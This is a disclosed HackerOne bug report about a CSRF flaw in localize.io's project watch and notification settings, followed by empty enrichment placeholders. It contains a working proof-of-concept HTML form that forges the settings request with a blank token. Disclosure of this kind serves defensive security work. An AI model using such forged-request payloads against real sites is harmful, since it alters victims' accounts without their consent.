---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '8273'
original_report_id: '8273'
title: Projects Watch or Notifications Settings Change Via CSRF
weakness: Cross-Site Request Forgery (CSRF)
team_handle: localize
created_at: '2014-04-21T02:36:16.407Z'
disclosed_at: '2014-05-21T03:15:29.824Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Projects Watch or Notifications Settings Change Via CSRF

## Metadata

- HackerOne Report ID: 8273
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: localize
- Disclosed At: 2014-05-21T03:15:29.824Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,

I have found a CSRF vulnerability using which the attacker can force the victim to chnage the settings for Projects Watch or Notifications Via CSRF as the anti-csrf token is not getting validated on the server-side.

Projects Watch or Notifications Settings Change Via CSRF Code:

<html>
  <body>
    <form action="http://www.localize.io/watch/9s" method="POST">
      <input type="hidden" name="CSRFToken" value="" />
      <input type="hidden" name="watch[events][1]" value="0" />
      <input type="hidden" name="watch[events][2]" value="0" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
